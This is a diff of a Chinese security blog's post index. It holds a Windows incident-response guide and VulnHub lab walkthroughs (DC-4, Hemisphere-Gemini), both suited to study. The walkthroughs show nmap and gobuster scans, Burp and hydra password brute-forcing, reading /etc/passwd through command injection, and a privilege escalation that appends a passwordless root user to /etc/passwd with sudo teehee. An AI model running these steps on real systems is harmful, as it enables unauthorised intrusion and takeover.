+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/15.png"></p>
+<h4 id="2-通过注册表查看"><a href="#2-通过注册表查看" class="headerlink" title="2.通过注册表查看"></a>2.通过注册表查看</h4><p>各个目录的含义看书吧 懒得打字了orz</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/16.jpg"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#注册表放自启动项目录（不完全整理）</span><br><span class="line">Explorer/Run键：</span><br><span class="line">HKEY_LOCAL_MACHINE_SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer/Run</span><br><span class="line">Userinit键：</span><br><span class="line">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/WindowsNT/CurrentVersion/Winlogon/Userinit</span><br><span class="line">RunServicesOnce键：</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunServicesOnce</span><br><span class="line">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/RunServicesOnce</span><br><span class="line">RunServices键：</span><br><span class="line">KEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunServices</span><br><span class="line">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/ CurrentVersion/RunServices</span><br><span class="line">Run键：</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Run</span><br><span class="line">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run</span><br><span class="line">Load键：</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/WindowsNT/CurrentVersion/Windows/load</span><br><span class="line">RunOnce/Setup键：</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunOnce/Setup</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/RunOnceEx</span><br></pre></td></tr></table></figure>
+
+<p>添加注册表也是惯用手段了。</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/17.png"></p>
+<h3 id="任务计划"><a href="#任务计划" class="headerlink" title="任务计划"></a>任务计划</h3><p>不详细讲了，看图就完事儿了，这个方法还是很明显的</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/17.5.png"></p>
+<h3 id="Windows防火墙网络出入"><a href="#Windows防火墙网络出入" class="headerlink" title="Windows防火墙网络出入"></a>Windows防火墙网络出入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh Firewall show state   #查看系统防火墙状态</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/18.png"></p>
+<p>在新版虽然已被弃用，但仍可以提供所需要的信息</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/19.png"></p>
+<hr>
+<h2 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h2><h3 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h3><h4 id="通过【任务管理器】查看"><a href="#通过【任务管理器】查看" class="headerlink" title="通过【任务管理器】查看"></a>通过【任务管理器】查看</h4><p>实践中我发现了各版本间有写不同，比如win10在进程格右键就能选择，而2003在【查看】选项中，win7的叫法也有所不同，不过差距都不大。Windows 2003我没有发现显示映像路径和命令行设置设置，很苦恼T T</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/20.png"></p>
+<p>总之就是要看到进程名称、PID、命令行，可以初步判断哪些进程和行为可疑，方便锁定目标。</p>
+<h4 id="使用【tasklist】命令进行排查"><a href="#使用【tasklist】命令进行排查" class="headerlink" title="使用【tasklist】命令进行排查"></a>使用【tasklist】命令进行排查</h4><p>和一些参数一起食用更佳</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc  #显示每个进程和服务的对应情况</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/21.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /m</span><br></pre></td></tr></table></figure>
+
+<p>对于某些加载DLL的恶意进程可以使用</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/22.png"></p>
+<p>查找特定的DLL后跟相应的进程模块即可。tasklist命令还有过滤器功能，可以结合具体情况使用</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/23.png"></p>
+<p>不知道有哪些功能的可以【tasklist /?】</p>
+<h4 id="使用【netstat】命令进行排查"><a href="#使用【netstat】命令进行排查" class="headerlink" title="使用【netstat】命令进行排查"></a>使用【netstat】命令进行排查</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/24.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano | findstr &quot;ESTABLISHED&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/25.png"></p>
+<p>ESTABLISHED，含义TCP:连接成功</p>
+<p>如果需要定位筛查具体名称的话，还可以联动tasklist</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如tasklist | find &quot;PID&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -anb 可以查找发起外连的程序，不过需要管理员权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/25.2.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic process get name,parentprocessid,processid /format:csv 这样看起来就简洁一点</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/25.3.png"></p>
+<h3 id="文件痕迹检查"><a href="#文件痕迹检查" class="headerlink" title="文件痕迹检查"></a>文件痕迹检查</h3><blockquote>
+<p>它们告诉我，你曾经存在过。</p>
+</blockquote>
+<h4 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h4><p>各个盘下的/temp、/tmp文件夹</p>
+<p>例如c:\windows\system32\inetsrv\MetaBase.<a href="https://so.csdn.net/so/search?q=xml&spm=1001.2101.3001.7020">xml</a>     #IIS配置文件</p>
+<p>还有就是MySQL，PHP，Apache等等的配置文件，这里不在过多阐述和总结。</p>
+<p>网上有很多现成又详细的总结，这里简单的其他博主的优秀文章。</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/weixin_50464560/article/details/119063335">https://blog.csdn.net/weixin_50464560/article/details/119063335</a></p>
+<p><a href="https://blog.csdn.net/lzz710107110/article/details/122386379">https://blog.csdn.net/lzz710107110/article/details/122386379</a></p>
+</blockquote>
+<h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><p>包括但不仅限于：浏览器历史记录、下载文件、cookie信息</p>
+<h4 id="查看用户Recent文件"><a href="#查看用户Recent文件" class="headerlink" title="查看用户Recent文件"></a>查看用户Recent文件</h4><p>访问过的文件夹或文件是有记录的如C:/Documents and Settings\Default User\Recent</p>
+<p>C:/Documents and Settings\用户名\Recent</p>
+<h4 id="查看预读取文件"><a href="#查看预读取文件" class="headerlink" title="查看预读取文件"></a>查看预读取文件</h4><p>Win+R输入【%SystemRoot%\Prefetch】即可发现pf预读取文件</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/28.png"></p>
+<p>另外，Amcache.hve【%SystemRoot%\appcompat\Programs 】文件可查询应用程序的执行路径、上次执行的时间及SHA1值</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/29.png"></p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/30.png"></p>
+<h3 id="时间点查找"><a href="#时间点查找" class="headerlink" title="时间点查找"></a>时间点查找</h3><h4 id="可列出攻击日期内新增的文件，从而发现相关的恶意软件。"><a href="#可列出攻击日期内新增的文件，从而发现相关的恶意软件。" class="headerlink" title="可列出攻击日期内新增的文件，从而发现相关的恶意软件。"></a>可列出攻击日期内新增的文件，从而发现相关的恶意软件。</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forfiles /m *.zip /d +2022/5/30 /s /p c:\ /c &quot;cmd /c echo @path @fdate @ftime&quot; 2&gt;null</span><br></pre></td></tr></table></figure>
+
+<p>很好用的命令 就是太长了记不住</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/31.png"></p>
+<h4 id="对文件的创建时间、修改时间、访问时间进行排查"><a href="#对文件的创建时间、修改时间、访问时间进行排查" class="headerlink" title="对文件的创建时间、修改时间、访问时间进行排查"></a>对文件的创建时间、修改时间、访问时间进行排查</h4><p>hacker有时候为了掩人耳目会对时间进行修改，然而这种行为经不起推敲。</p>
+<p>修改时间后，这三种时间会有逻辑上的问题，需要工程师留心注意。</p>
+<h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>不能判断哪个是webshell的话就上D盾，上云沙箱</p>
+<p>或者看对外建立的链接，去查ip或者外联传输的情况。</p>
+<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>分为系统日志，安全性日志，应用程序日志</p>
+<p>除了windows系统日志，还可以对中间件日志，ftp日志，数据库日志进行相关分析</p>
+<p>【这些东西有很多，笔者在此不多赘述，大家自行利用搜索引擎收集即可】</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/32.png"></p>
+<h3 id="内存分析"><a href="#内存分析" class="headerlink" title="内存分析"></a>内存分析</h3><p>分析的话，主要是各种工具的使用，在此不多赘述。</p>
+<p>市面上流行的商业软件都很不错，比如取证大师，火眼，盘古石等。</p>
+<p>当然volatility等也是很优秀的（建议用2版本）</p>
+<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>Wireshark是很棒的分析工具，1、要会抓包 2、要会分析（善用过滤器）简单分享几个我用的比较多的。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.addr == ip    #过滤特定ip</span><br><span class="line">ip.src == ip     #过滤源ip</span><br><span class="line">ip.dst == ip     #过滤目的ip</span><br><span class="line">http、https、smtp、arp等协议直接输入即可筛选</span><br><span class="line">top.sort == 端口号 #对端口号进行过滤</span><br><span class="line">tcp contains xxx   #在数据包中筛查某一关键字</span><br><span class="line">arp.opcode==2     #过滤ARP应答帧</span><br><span class="line">arp.opcode==1     #过滤ARP请求帧</span><br><span class="line">http.response==1 &amp;&amp; http.response.code==200 #响应请求成功的包</span><br><span class="line">tcp.flags.ack==1&amp;&amp;tcp.flags.syn==1   #抓握手包</span><br></pre></td></tr></table></figure>
+
+<h3 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h3><p>ip和域名网上多查查</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://x.threatbook.cn/  #微步平时也要闲着没事逛逛，说不定有意外惊喜呢</span><br><span class="line">https://ti.qianxin.com/   #奇安信威胁情报中心（个人认为做得非常好）</span><br><span class="line">https://ti.nsfocus.com/  #绿盟威胁情报云</span><br><span class="line">https://ti.360.com/#/homepage   #360威胁情报中心</span><br><span class="line">https://exchange.xforce.ibmcloud.com/ #IBM X-Force Exchange</span><br><span class="line">https://whois.chinaz.com/    #站长之家</span><br><span class="line">https://ip138.com/   #ip查询网</span><br><span class="line">http://www.scap.org.cn/   #VULHUB信息安全漏洞门户</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>遇见可疑文件有事儿没事儿了多找几个地方上传一下，气死红队（）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.virustotal.com/gui/home/upload  #virustotal</span><br><span class="line">https://s.threatbook.cn/   #微步云沙箱</span><br><span class="line">https://ata.360.cn/     #360安全大脑沙箱云</span><br><span class="line">https://habo.qq.com/  #腾讯哈勃系统</span><br><span class="line">https://sandbox.freebuf.com/detect?theme=freebuf  #大圣云沙箱（有点慢）</span><br></pre></td></tr></table></figure>
+
+<p>总结的内容到这里就要结束了，当然整本书300+页，后面有很多经典案例分享，如挖矿木马，勒索病毒，流量劫持等等。总的来说，是一本非常可读的书，值得想了解应急响应的同学学习一番。这些也有可能给红队的同学一些小启发哟~</p>
+<blockquote>
+<p>若不去改变，明天永远只是今天的重演。</p>
+</blockquote>
+<hr>
+]]></content>
+      <categories>
+        <category>蓝队学习之路</category>
+      </categories>
+      <tags>
+        <tag>应急响应</tag>
       </tags>
   </entry>
   <entry>
@@ -679,57 +977,6 @@
       </tags>
   </entry>
   <entry>
-    <title>靶机DC-4的渗透记录</title>
-    <url>/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>之前忙比赛，忙期末，没怎么好好学习。这几天全都补回来。</p>
-<blockquote>
-<p>下载地址：<a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p>
-</blockquote>
-<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>渗透机×1 kali2021<br>靶机DC-4×1  网络连接模式：NAT模式<br>还有，学习时必不可少搜索引擎qwq</p>
-<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>先打开靶机DC-4<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>老规矩了 扫描内网，然后看一眼mac地址确定目标ip</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"></p>
-<span id="more"></span>
-<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>确定好ip之后，上namp扫描主机</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.136</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"></p>
-<h2 id="Burp-Suite爆破登录"><a href="#Burp-Suite爆破登录" class="headerlink" title="Burp Suite爆破登录"></a>Burp Suite爆破登录</h2><p>发现ssh和web开着，先去网页那里看一下<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>很简单的一个登录界面<br>这里尝试用Burp Suite进行爆破 先开代理抓包<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>可以发现里面的password密码没有加过密，也没有验证码，那就开始爆破！<br>发送到intruder 在password那里添加爆破点 模式设置为spider（狙击手）<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>position里选择Runtime file（运行时文件） 然后start attack<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>发现有一个和别的长度都不一样 于是用happy登录<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>成功了！</p>
-<h2 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h2><p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>打开点了点，没发现什么有趣的东西。<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>抓包看看有什么东西吧<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>提交的信息是ls -l，感觉会是一处命令执行<br>查看一下配置信息，发现有3个账户，一会应该有用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>讲道理，这里发现命令执行之后应该打反弹shell，但是我这不知道为啥一直不成，没办法只能另想办法了<br>又慢慢看了一些目录，发现有一个地方藏着一份密码字典。别问我怎么知道的，因为别的两个用户都没那个文件夹。<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"></p>
-<h2 id="利用hydra进行ssh密码爆破"><a href="#利用hydra进行ssh密码爆破" class="headerlink" title="利用hydra进行ssh密码爆破"></a>利用hydra进行ssh密码爆破</h2><p>那接下来思路就很明了了，爆破ssh密码即可<br>这里就要上kali内置的爆破神器hydra了 因为密码字典是在jim那里发现的，爆破用户Jim即可</p>
-<blockquote>
-<p>hydra的使用 <a href="https://www.cnblogs.com/cowherd/p/13297837.html">https://www.cnblogs.com/cowherd/p/13297837.html</a><br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"></p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L dc4user.txt -P dc4.txt 192.168.55.136 -t 20 ssh </span><br></pre></td></tr></table></figure>
-<p>爆破成功，得到密码，shh进行连接。<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh jim@192.168.55.136     #password:jibril04</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>简单看一下，发现有个mail 打开发现是一个测试邮件<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>这应该是一个小hint，一般邮件的目录在/var/mail，于是去进入该目录<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br>好家伙 密码就这么给了 那直接去登charles咯</p>
-<h2 id="切换到用户charles进行渗透"><a href="#切换到用户charles进行渗透" class="headerlink" title="切换到用户charles进行渗透"></a>切换到用户charles进行渗透</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh charles@192.168.55.136     #password:^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"><br>同样的流程也在这里走一遍，看看会不会有新的发现。想查看邮件的时候发现我们没有权限<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/25.png"><br>应该是需要提权了</p>
-<h2 id="teehee提权"><a href="#teehee提权" class="headerlink" title="teehee提权"></a>teehee提权</h2><p>先查看拥有哪些权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">![](26.png)</span><br></pre></td></tr></table></figure>
-<p>发现可以免密码执行<br>提供了teehee命令，查看一下使用手册之后尝试一下写入文件内容进行提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo teehee -a /etc/passwd</span><br><span class="line">a::0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
-<p>写入一个有root权限的用户 并切换成用户</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su a</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/27.png"><br>ls查看目录后发现有个flag文件<br>打开，获得flag，渗透结束。<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/28.png"></p>
-<hr>
-<p>这次渗透也学到了很多东西。<br>任意命令执行的掌握又加了一些<br>了解了一些/var存放的一些配置文件<br>用teehee提权写入一个root用户<br>熟练的点开搜索引擎（）<br>反正收获蛮多的~</p>
-<hr>
-<blockquote>
-<p>追逐影子的人，自己就是影子</p>
-</blockquote>
-<hr>
-]]></content>
-      <categories>
-        <category>靶机渗透记录</category>
-      </categories>
-      <tags>
-        <tag>靶机渗透记录</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>靶机DC-2的渗透记录</title>
     <url>/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<blockquote>
@@ -784,31 +1031,46 @@
       </tags>
   </entry>
   <entry>
-    <title>靶机Hemisphere-Gemini渗透记录</title>
-    <url>/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机Hemisphere-Gemini×1<br>渗透机kali 2021.2×1 和靶机在同一网段<br>如果网卡不一致还需要先改一下靶机网卡<br>靶机很简单很简单，放轻松~</p>
-<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开靶机<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>老规矩，首先要确定靶机ip。先看mac地址是多少</p>
-<span id="more"></span>
-
-<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br>然后扫描确定ip</p>
+    <title>靶机DC-4的渗透记录</title>
+    <url>/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>之前忙比赛，忙期末，没怎么好好学习。这几天全都补回来。</p>
+<blockquote>
+<p>下载地址：<a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p>
+</blockquote>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>渗透机×1 kali2021<br>靶机DC-4×1  网络连接模式：NAT模式<br>还有，学习时必不可少搜索引擎qwq</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>先打开靶机DC-4<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>老规矩了 扫描内网，然后看一眼mac地址确定目标ip</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>确定ip之后用nmap进行更深层次的信息探测</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.155.163</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>80端口开着，可以先访问一下网页<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>点了点没什么东西，那就在扫一下目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u  http://192.168.155.163/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>访问/Portal 又是一个页面，先点点<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"></p>
